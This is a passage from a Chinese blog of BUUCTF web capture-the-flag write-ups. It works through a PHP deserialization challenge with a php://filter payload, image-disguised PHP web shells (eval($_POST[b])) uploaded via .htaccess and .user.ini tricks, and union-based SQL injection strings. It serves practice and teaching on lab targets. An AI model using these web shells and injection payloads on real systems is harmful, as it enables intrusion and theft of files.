way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>第一关传参gg,id因为是强相等，所以数组绕过</p>
+<p>第二关passwd，不能传数字，还要等于1234567,但是是弱相等，传字符类型开头是1234567就行</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/92.png"></p>
+<h4 id="27-网鼎杯-2020-青龙组-AreUSerialz"><a href="#27-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="27.[网鼎杯 2020 青龙组]AreUSerialz"></a>27.[网鼎杯 2020 青龙组]AreUSerialz</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line">    </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = &quot;1&quot;;</span><br><span class="line">        $filename = &quot;/tmp/tmpfile&quot;;</span><br><span class="line">        $content = &quot;Hello World!&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function process() &#123;</span><br><span class="line">        if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">            $res = $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private function write() &#123;</span><br><span class="line">        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span><br><span class="line">            if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span><br><span class="line">                $this-&gt;output(&quot;Too long!&quot;);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span><br><span class="line">            if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br><span class="line">            else $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Failed!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private function read() &#123;</span><br><span class="line">        $res = &quot;&quot;;</span><br><span class="line">        if(isset($this-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private function output($s) &#123;</span><br><span class="line">        echo &quot;[Result]: &lt;br&gt;&quot;;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op === &quot;2&quot;)</span><br><span class="line">            $this-&gt;op = &quot;1&quot;;</span><br><span class="line">        $this-&gt;content = &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_valid($s) &#123;</span><br><span class="line">    for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="line">        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="line">            return false;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="line">    if(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反序列化思路很简单，重点再is_valid函数，它检测传进来的是否是可读字符串，如果不是返回false，这里的op,filename,content都是protected属性，序列化后会出现不可打印字符</p>
+<p>反序列化思路：</p>
+<p>我们最终要利用read()函数中的file_get_contents($this-&gt;filename)来读取flag.php文件，</p>
+<p>触发read()函数，需要满足process()函数中的$this-&gt;op &#x3D;&#x3D; “2”,注意这里是弱相等</p>
+<p>然而还有一个析构函数 __destruct()，这里面用了$this-&gt;op &#x3D;&#x3D;&#x3D; “2”，强相等，如果等于字符串2，那就把它赋值为1。因此我们要绕过该赋值,我们可以给op赋值为数字2，这样就不会与字符串2相等，但是能触发read()函数。相当于绕过了析构函数。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/93.png"></p>
+<p>看输出结果，出现了不可见字符，我们手动删除，并将前面数字减去3即可。或者构造exp时，将op,filename,content类型修改为pubilc。</p>
+<p>最终payload：?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”;s:7:”content”;s:3:”123”;}</p>
+<h4 id="28-GXYCTF2019-BabyUpload"><a href="#28-GXYCTF2019-BabyUpload" class="headerlink" title="28.[GXYCTF2019]BabyUpload"></a>28.[GXYCTF2019]BabyUpload</h4><p>上传一个shell.jpg</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/94.png"></p>
+<p>后端也对文件内容进行了过滤</p>
+<p>换个文件头</p>
+<script language="php"> eval($_POST[b]);</script>
+
+<p>后缀改为jpg，上传成功了</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/95.png"></p>
+<p>重新上传bp抓包</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/96.png"></p>
+<p>改名字为shell。</p>
+<p>再上传一个.htaccess文件使其将shell解析为php代码</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/97.png"></p>
+<p>注意更改content-type为image&#x2F;jpeg，因为对htaccess文件进行了过滤</p>
+<p>最后蚁剑连接即可。</p>
+<h4 id="29-SUCTF-2019-CheckIn"><a href="#29-SUCTF-2019-CheckIn" class="headerlink" title="29.[SUCTF 2019]CheckIn"></a>29.[SUCTF 2019]CheckIn</h4><p>还是先上传一个shell.jpg，回显not image</p>
+<p>后端还是对文件内容进行了检查，我们添加一个幻术文件头试试</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/98.png"></p>
+<p>上传成功了。继续上传htaccess文件发现怎么都上传不了，后端过滤了。</p>
+<p>看到大佬们的wp，涨姿势了。这里要用到.user.ini文件,原理见：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhiliu/p/16825982.html">https://www.cnblogs.com/zhiliu/p/16825982.html</a></p>
+<p>先上传一个.user.ini文件内容为</p>
+<p>GIF89a<br>auto_prepend_file&#x3D;shell.jpg</p>
+<p>GIF89a用来绕过后端检测，auto_prepend_file&#x3D;shell.jpg为内容</p>
+<p>接着上传shell.jpg，内容为</p>
+<p>GIF89a<script language="php"> eval($_POST[b]);</script></p>
+<p>这样通过.user.ini文件漏洞，就可以将图片马解析为php</p>
+<p>最后蚁剑连接。注意文件路径：<a target="_blank" rel="noopener" href="http://d9327910-1142-4419-8f84-c8428527968b.node5.buuoj.cn:81/uploads/c7129430ace4c05bd5bcee0bd02b538b/index.php">http://d9327910-1142-4419-8f84-c8428527968b.node5.buuoj.cn:81/uploads/c7129430ace4c05bd5bcee0bd02b538b/index.php</a></p>
+<p>最后是index.php。</p>
+<h4 id="30-GXYCTF2019-BabySQli"><a href="#30-GXYCTF2019-BabySQli" class="headerlink" title="30.[GXYCTF2019]BabySQli"></a>30.[GXYCTF2019]BabySQli</h4><p>用户名输入1’报错了，判断为字符型注入</p>
+<p>过滤了or database()，堆叠注入报错注入都不行了。</p>
+<p>没有过滤union select，可以用联合查询。</p>
+<p>先判断字段1’ union select 1,2#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/99.png"></p>
+<p>报错了，字段数不对。1’ union select 1,2,3#</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/100.png"></p>
+<p>查看页面源代码</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20240707213031302.png" alt="image-20240707213031302"></p>
+<p>拿去base32,base64后为 select * from user where username &#x3D; ‘$name’</p>
+<p>看了大佬们的wp，这题还要去看源码。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/102.png"></p>
+<p>用户名admin，密码要MD5后和字段相等。</p>
+<p>先判断用户名和密码的字段</p>
+<p>1’ union select 1,’admin’,3#</p>
+<p>回显wrong pass，说明第二个字段是用户名，那么第三个字段一定就是密码了。</p>
+<p>随便输入密码，将其MD5加密后传入第三个字段。</p>
+<p><img src="/images/BUUCTF-WEB%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/123.png"></p>
+<p>202cb962ac59075b964b07152d234b70是123的md5加密后结果</p>
 
     </div>
 
